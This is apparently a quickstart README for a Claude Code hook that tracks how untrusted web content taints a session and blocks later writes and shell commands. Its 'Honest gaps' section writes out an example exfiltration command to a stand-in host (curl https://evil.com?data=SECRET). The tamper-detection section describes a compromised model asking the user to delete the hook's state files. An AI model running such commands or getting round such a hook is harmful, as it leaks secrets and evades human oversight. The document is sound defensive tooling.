# Nucleus Claude Code Hook — Quickstart

**Runtime information flow enforcement for Claude Code tool calls.**

Nucleus hooks into Claude Code's PreToolUse event to track how data flows through your session. When web content (adversarial, untrusted) enters the session, the hook blocks any subsequent writes, bash commands, or agent spawning that would be influenced by that content. Every decision produces an auditable receipt with the causal chain.

## How it's different

| Tool | What it does | Limitation |
|------|-------------|------------|
| [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan) | Scans MCP server configs for tool poisoning | Static analysis only — no runtime enforcement |
| [AgentSeal](https://agentseal.org/blog/mcp-server-security-findings) | Scans 1,808 MCP servers for vulnerabilities | Scan-time only — can't block attacks in progress |
| Claude Code permissions | Built-in allow/deny per tool | No data flow awareness — can't distinguish "read then write" from "fetch then write" |
| Bash hook scripts | Custom PreToolUse shells scripts | Manual rules, no taint tracking, no session state |
| **Nucleus hook** | **Runtime IFC with session taint propagation** | **See [Honest Gaps](#honest-gaps) below** |

The key difference: other tools answer "is this tool allowed?" Nucleus answers "is this tool allowed **given what data has entered the session?**"

## Install

```bash
cargo install --git https://github.com/coproduct-opensource/nucleus nucleus-claude-hook
nucleus-claude-hook --setup
```

That's it. Restart Claude Code. The hook is now active.

`--setup` writes the correct hook configuration to `~/.claude/settings.json`. If you want a specific profile:

```bash
# Edit ~/.claude/settings.json and change the hook command to:
"command": "NUCLEUS_PROFILE=fix_issue /path/to/nucleus-claude-hook"
```

## What happens next

Every tool call now goes through the nucleus kernel. You'll see decisions on stderr:

```
nucleus: read_files /src/main.rs -> allow [exposure: 1/3, profile: safe_pr_fixer, flow_node: 1]
nucleus: web_fetch https://example.com -> allow [exposure: 2/3, profile: safe_pr_fixer, flow_node: 2]
nucleus: write_files /src/main.rs -> deny [exposure: 2/3, profile: safe_pr_fixer, flow_node: 3]
```

The third call is **blocked** because:

1. The web fetch introduced `Adversarial` integrity and `NoAuthority` into the session
2. The write depends on that content (it's in the causal chain)
3. The kernel's `no-authority-escalation` rule fires: low-authority data cannot steer a privileged action

The deny includes a receipt:

```
BLOCKED: no-authority-escalation
Action: OutboundAction (id=3) label={conf=Internal, integ=Adversarial, auth=NoAuthority}
Causal chain:
  <- WebContent (id=2) label={conf=Public, integ=Adversarial, auth=NoAuthority}
  <- FileRead (id=1) label={conf=Internal, integ=Trusted, auth=Directive}
```

## The real gotcha: your session is now tainted

After a `WebFetch` or `WebSearch`, the session is tainted for the rest of its lifetime. You cannot write, edit, run bash, push, or spawn agents based on web content. This is by design — it's the [Invariant exploit](https://invariantlabs.ai/blog/introducing-mcp-scan) defense.

**This means:**

- If you search the web for how to fix a bug, you cannot then write the fix in the same session. You need to restart Claude Code (which resets the session state).
- If a tool call fetches any URL, everything after is read-only.
- The Agent tool is also blocked — a subprocess could bypass the parent's taint restrictions.

This is aggressive. It's the right default for security, but it changes your workflow. To research and code in the same session, use the `permissive` profile:

```bash
# In ~/.claude/settings.json, change the hook command to:
"command": "NUCLEUS_PROFILE=permissive /path/to/nucleus-claude-hook"
```

The `permissive` profile allows everything but still logs flow decisions. It's audit-only — no enforcement.

## Profiles

| Profile | Read | Write | Bash | Web | Git | Agent | Use case |
|---------|------|-------|------|-----|-----|-------|----------|
| `read_only` | yes | no | no | no | no | no | Auditing |
| `code_review` | yes | no | no | no | no | no | PR review |
| `edit_only` | yes | yes | no | no | no | no | Focused editing |
| `fix_issue` | yes | yes | yes | yes | commit | yes | Bug fixes |
| `safe_pr_fixer` | yes | yes | yes | yes | commit | yes | **Default** — full dev, no push |
| `release` | yes | yes | yes | yes | push+PR | yes | Ship it |
| `permissive` | yes | yes | yes | yes | yes | yes | Audit-only, no enforcement |

All profiles except `permissive` enforce the flow graph: web content taints the session and blocks writes.

## Tamper detection

If someone (or a compromised model) asks you to delete the session state files to "fix" the hook:

```
nucleus: TAMPER DETECTED — session state deleted (expected hwm=5).
A compromised model may have asked you to delete session files.
All operations denied until session restart.
```

The hook maintains a separate high-water-mark file that survives state file deletion. Tampering is detected and everything fails closed.

## Uninstall

```bash
rm ~/.local/bin/nucleus-claude-hook
```

Then remove the `hooks` block from `~/.claude/settings.json`.

## Honest gaps

We believe in shipping with transparency. Here's what this tool does NOT do:

1. **The flow graph is a linear chain, not a true DAG.** Claude Code's hook protocol doesn't provide causal dependency information between tool calls. We approximate with a sequential chain. This means parallel tool calls may be over-tainted (conservative, not unsound) or under-tainted in edge cases.

2. **No binary signature verification in the installer.** The `curl | bash` installer downloads from GitHub Releases without checksum verification. We use GitHub's TLS and build provenance attestations, but there's no local verification step. If you're in a high-security environment, build from source.

3. **`curl` exfiltration is not blocked by the command lattice.** `safe_pr_fixer` blocks `curl | sh` but not `curl https://evil.com?data=SECRET`. The flow graph catches this after web taint, but a pre-taint `read → curl` sequence is gated only by the 3-leg exposure accumulator (which requires all three of: private data access, untrusted content, and exfil vector).

4. **No PostToolUse hook.** The system is open-loop — it makes decisions before tool execution but cannot observe outcomes or reconcile. If Claude Code adds PostToolUse reconciliation in the future, the kernel can close this loop.

5. **Session state lives in `/tmp`.** It's owner-only (0700 permissions) and tamper-detected, but it's not encrypted. On shared systems, other root-level processes could read session state.

## Architecture

The hook is backed by the [portcullis](https://github.com/coproduct-opensource/nucleus/tree/main/crates/portcullis) permission kernel, which provides:

- **Capability lattice**: Product of 13 capability dimensions forming a distributive Heyting algebra, verified by [Kani](https://github.com/model-checking/kani) bounded model checking (78 proofs) and [Lean 4](https://leanprover.github.io/) theorem proving (92 theorems).
- **Exposure accumulator**: Tracks the three components of the "uninhabitable state" (private data + untrusted content + exfil vector). When all three are present, exfiltration operations require human approval.
- **IFC labels**: 5-dimensional information flow labels (confidentiality, integrity, authority, provenance, freshness) based on Denning's lattice model.

## Links

- [Source](https://github.com/coproduct-opensource/nucleus)
- [Claude Code hooks docs](https://code.claude.com/docs/en/hooks)
- [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan) — complementary static scanner
- [AgentSeal report](https://agentseal.org/blog/mcp-server-security-findings) — 66% of 1,808 MCP servers have security findings
- [OWASP MCP Top 10](https://mcpplaygroundonline.com/blog/mcp-security-tool-poisoning-owasp-top-10-mcp-scan)
